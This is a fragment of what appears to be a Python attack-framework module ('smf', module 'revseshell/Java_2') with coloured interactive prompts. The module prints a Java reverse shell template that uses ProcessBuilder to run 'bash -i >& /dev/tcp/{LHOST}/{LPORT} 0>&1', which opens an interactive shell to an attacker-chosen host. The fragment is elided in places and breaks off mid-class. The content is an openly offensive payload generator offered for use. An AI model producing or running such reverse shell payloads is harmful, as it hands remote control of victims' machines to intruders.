...
while True:  
    try:
        exin = input("\033[1;32msmf\033[1;34m(\033[1;31mrevseshell/Java_2\033[1;34m) > \033[1;32m")
...
while True:
                    exin2 = input("\033[1;31m(\033[1;34mrevseshell/Java_2\033[1;31m)> \033[1;32m")
...
time.sleep(0.5)
print("\033[1m\033[92m[+]-[Shell]\033[0m \033[1;34mthis is your reverseshell with java")
time.sleep(1)
print("""
\033[1;32mpublic class shell {
    public static void main(String[] args) {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1")
